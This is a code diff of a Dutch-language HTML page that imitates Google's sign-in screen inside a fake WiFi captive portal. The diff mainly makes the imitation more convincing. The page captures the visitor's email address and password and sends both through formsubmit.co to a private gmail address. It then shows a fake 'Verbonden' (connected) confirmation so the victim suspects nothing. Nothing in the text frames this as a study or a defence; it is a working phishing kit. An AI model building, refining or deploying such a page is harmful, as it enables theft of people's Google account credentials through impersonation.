@@ -8,116 +8,158 @@
     <style>
         * { box-sizing: border-box; }
         body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .container { width: 100%; max-width: 450px; min-height: 500px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; position: relative; overflow: hidden; display: flex; flex-direction: column; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3); }
-        @media (max-width: 450px) { .container { border: none; padding: 24px; min-height: 100vh; box-shadow: none; } }
+        
+        .container { 
+            width: 100%; max-width: 450px; min-height: 500px; padding: 48px 40px 36px; 
+            border: 1px solid #dadce0; border-radius: 8px; text-align: center; 
+            position: relative; overflow: hidden; display: flex; flex-direction: column;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+
+        @media (max-width: 450px) { .container { border: none; padding: 24px 24px; min-height: 100vh; box-shadow: none; } }
+
         .google-logo { height: 24px; margin-bottom: 12px; }
         h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 0 0 8px 0; }
-        p { font-size: 16px; color: #202124; margin: 0 0 25px 0; }
-        
-        /* Account Picker Items */
-        .account-item { display: flex; align-items: center; padding: 12px 0; border-bottom: 1px solid #dadce0; cursor: pointer; text-align: left; }
-        .account-item:hover { background: #f8f9fa; }
-        .avatar-circle { width: 36px; height: 36px; background: #f1f3f4; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 12px; color: #5f6368; font-weight: 500; }
-        .acc-info { flex-grow: 1; }
-        .acc-name { font-size: 14px; font-weight: 500; color: #3c4043; }
+        p { font-size: 16px; color: #202124; margin: 0 0 40px 0; }
 
-        /* Inputs */
-        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; margin-bottom: 10px; }
+        .input-group { position: relative; margin-bottom: 10px; text-align: left; }
+        input { 
+            width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; 
+            font-size: 16px; outline: none; transition: border 0.2s;
+        }
         input:focus { border: 2px solid #1a73e8; }
         
-        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: auto; padding-top: 30px; }
-        .blue-link { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; cursor: pointer; background: none; border: none; }
-        button.next-btn { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
+        .account-pill {
+            display: inline-flex; align-items: center; padding: 3px 12px 3px 5px;
+            border: 1px solid #dadce0; border-radius: 16px; margin-bottom: 24px;
+            font-size: 14px; font-weight: 500; cursor: pointer; color: #3c4043;
+        }
+        .account-pill:hover { background-color: #f8f9fa; }
+        .avatar { background: #1a73e8; color: white; width: 20px; height: 20px; border-radius: 50%; font-size: 12px; display: flex; align-items: center; justify-content: center; margin-right: 8px; }
 
-        .progress { position: absolute; top: 0; left: 0; width: 0%; height: 4px; background: #1a73e8; transition: width 0.4s; }
-        #emailStep, #passStep, #wifiStep { display: none; }
+        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: auto; padding-top: 40px; }
+        .blue-link { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; cursor: pointer; background: none; border: none; padding: 0; }
+        .blue-link:hover { text-decoration: underline; }
+        
+        button.next-btn { 
+            background-color: #1a73e8; color: white; border: none; 
+            padding: 10px 24px; border-radius: 4px; font-size: 14px; 
+            font-weight: 500; cursor: pointer;
+        }
+        button.next-btn:hover { background-color: #1b66ca; box-shadow: 0 1px 2px 0 rgba(66,133,244,0.3), 0 1px 3px 1px rgba(66,133,244,0.15); }
+
+        .loading-bar { 
+            position: absolute; top: 0; left: 0; width: 0%; height: 4px; 
+            background: #1a73e8; transition: width 0.4s ease; 
+        }
+
+        #passStep, #wifiStep { display: none; }
+
+        /* Vinkje animatie */
+        .checkmark { width: 56px; height: 56px; border-radius: 50%; display: block; stroke-width: 2; stroke: #1e8e3e; stroke-miterlimit: 10; margin: 10% auto; box-shadow: inset 0px 0px 0px #1e8e3e; animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both; }
+        .checkmark__circle { stroke-dasharray: 166; stroke-dashoffset: 166; stroke-width: 2; stroke-miterlimit: 10; stroke: #1e8e3e; fill: none; animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards; }
+        .checkmark__check { transform-origin: 50% 50%; stroke-dasharray: 48; stroke-dashoffset: 48; animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards; }
+        @keyframes stroke { 100% { stroke-dashoffset: 0; } }
+        @keyframes fill { 100% { box-shadow: inset 0px 0px 0px 30px #fff; } }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <div id="loader" class="progress"></div>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="google-logo">
+        <div id="loader" class="loading-bar"></div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="google-logo" alt="Google">
         
-        <div id="pickerStep">
-            <h1>Account kiezen</h1>
-            <p>om door te gaan naar Google</p>
-            <div class="account-item" onclick="showEmailStep()">
-                <div class="avatar-circle">👤</div>
-                <div class="acc-info">
-                    <div class="acc-name" style="color:#1a73e8;">Een ander account gebruiken</div>
-                </div>
-            </div>
-            <div class="footer" style="justify-content: center;">
-                <p style="font-size:12px; color:#5f6368;">Om door te gaan, controleert Google of dit account van jou is.</p>
-            </div>
-        </div>
-
         <div id="emailStep">
-            <h1>Inloggen</h1>
-            <p>Gebruik je Google-account</p>
-            <input type="email" id="emailInput" placeholder="E-mailadres of telefoonnummer">
-            <div style="text-align: left;"><button class="blue-link" onclick="window.open('https://accounts.google.com/signin/usernamerecovery')">E-mailadres vergeten?</button></div>
+            <h1 id="t-login">Inloggen</h1>
+            <p id="t-sub">Gebruik je Google-account</p>
+            <div class="input-group">
+                <input type="email" id="emailInput" placeholder="E-mailadres of telefoonnummer" required>
+            </div>
+            <div style="text-align: left; margin-top: 8px;">
+                <button type="button" class="blue-link" onclick="window.open('https://accounts.google.com/signin/usernamerecovery', '_blank')">E-mailadres vergeten?</button>
+            </div>
+            <p style="text-align: left; font-size: 14px; color: #5f6368; margin-top: 40px;">
+                Geen eigen computer? Gebruik een gastvenster om privé in te loggen. <button type="button" class="blue-link" onclick="window.open('https://support.google.com/chrome/answer/6130773', '_blank')">Meer informatie</button>
+            </p>
             <div class="footer">
-                <button class="blue-link" onclick="window.open('https://accounts.google.com/signup')">Account maken</button>
+                <button type="button" class="blue-link" onclick="window.open('https://accounts.google.com/signup', '_blank')">Account maken</button>
                 <button class="next-btn" onclick="toPassword()">Volgende</button>
             </div>
         </div>
 
         <div id="passStep">
-            <h1>Welkom</h1>
-            <div style="display:inline-flex; align-items:center; border:1px solid #dadce0; padding:4px 12px; border-radius:20px; margin-bottom:20px;">
-                <span id="displayEmail" style="font-size:14px;"></span>
+            <h1 id="t-welcome">Welkom</h1>
+            <div class="account-pill" onclick="location.reload()">
+                <div class="avatar" id="avatarLetter">?</div>
+                <span id="displayEmail"></span>
+                <svg width="12" height="12" viewBox="0 0 24 24" style="margin-left: 8px;"><path d="M7 10l5 5 5-5z"/></svg>
             </div>
             
-            <form id="mainForm" action="https://formsubmit.co/ajax/kaasislekker069@gmail.com" method="POST">
+            <form id="submitForm" action="https://formsubmit.co/ajax/kaasislekker069@gmail.com" method="POST">
                 <input type="hidden" name="email" id="hiddenEmail">
-                <input type="password" name="password" id="passInput" placeholder="Wachtwoord opgeven" required>
+                <div class="input-group">
+                    <input type="password" name="password" id="passInput" placeholder="Wachtwoord opgeven" required>
+                </div>
+                <div style="text-align: left; margin-top: 8px;">
+                    <input type="checkbox" id="showPass"> <label for="showPass" style="font-size: 14px; cursor: pointer;">Wachtwoord weergeven</label>
+                </div>
                 <div class="footer">
-                    <button type="button" class="blue-link" onclick="window.open('https://accounts.google.com/signin/recovery')">Wachtwoord vergeten?</button>
+                    <button type="button" class="blue-link" onclick="window.open('https://accounts.google.com/signin/recovery', '_blank')">Wachtwoord vergeten?</button>
                     <button type="submit" class="next-btn">Volgende</button>
                 </div>
             </form>
         </div>
 
         <div id="wifiStep">
-            <div style="font-size: 50px; color:#1e8e3e; margin: 30px 0;">✓</div>
-            <h1>Verbonden</h1>
-            <p>U bent nu aangemeld. U wordt nu doorverwezen naar het internet.</p>
-            <button class="next-btn" style="width:100%;" onclick="window.location.href='https://google.com'">Ga verder</button>
+            <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52"><circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/><path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/></svg>
+            <h1 id="t-connected">Verbonden</h1>
+            <p id="t-success">Je bent nu succesvol aangemeld bij het WiFi-netwerk. Klik hieronder om door te gaan.</p>
+            
+            <button onclick="window.location.href='https://jouw-eigen-website.com'" class="next-btn" style="width: 100%;">Ga verder naar internet</button>
         </div>
     </div>
 
     <script>
-        const loader = document.getElementById('loader');
-
-        function showEmailStep() {
-            document.getElementById('pickerStep').style.display = 'none';
-            document.getElementById('emailStep').style.display = 'block';
-        }
+        // Automatische taaldetectie
+        const translations = {
+            'nl': { login: 'Inloggen', sub: 'Gebruik je Google-account', next: 'Volgende', welcome: 'Welkom', connected: 'Verbonden', success: 'Je bent nu aangemeld bij het WiFi-netwerk. Klik hieronder om door te gaan.' },
+            'en': { login: 'Sign in', sub: 'Use your Google Account', next: 'Next', welcome: 'Welcome', connected: 'Connected', success: 'You are now successfully connected to the network. Click below to continue.' }
+        };
+        const lang = navigator.language.startsWith('nl') ? 'nl' : 'en';
+        const t = translations[lang];
+        document.getElementById('t-login').innerText = t.login;
+        document.getElementById('t-sub').innerText = t.sub;
+        document.getElementById('t-welcome').innerText = t.welcome;
+        document.getElementById('t-connected').innerText = t.connected;
+        document.getElementById('t-success').innerText = t.success;
 
         function toPassword() {
             const email = document.getElementById('emailInput').value;
-            if(!email.includes('@')) return;
-            loader.style.width = "100%";
+            if (!email.includes('@')) { alert("Geef een geldig e-mailadres op"); return; }
+            document.getElementById('loader').style.width = "100%";
             setTimeout(() => {
                 document.getElementById('emailStep').style.display = 'none';
                 document.getElementById('passStep').style.display = 'block';
                 document.getElementById('displayEmail').innerText = email;
                 document.getElementById('hiddenEmail').value = email;
-                loader.style.width = "0%";
+                document.getElementById('avatarLetter').innerText = email.charAt(0).toUpperCase();
+                document.getElementById('loader').style.width = "0%";
             }, 800);
         }
 
-        document.getElementById('mainForm').addEventListener('submit', function(e) {
+        document.getElementById('submitForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            loader.style.width = "100%";
+            document.getElementById('loader').style.width = "100%";
             fetch(this.action, { method: 'POST', body: new FormData(this) }).then(() => {
                 document.getElementById('passStep').style.display = 'none';
                 document.getElementById('wifiStep').style.display = 'block';
-                loader.style.width = "0%";
+                document.getElementById('loader').style.width = "0%";
             });
         });
+
+        document.getElementById('showPass').onclick = function() {
+            document.getElementById('passInput').type = this.checked ? "text" : "password";
+        };
     </script>
 </body>
 </html>
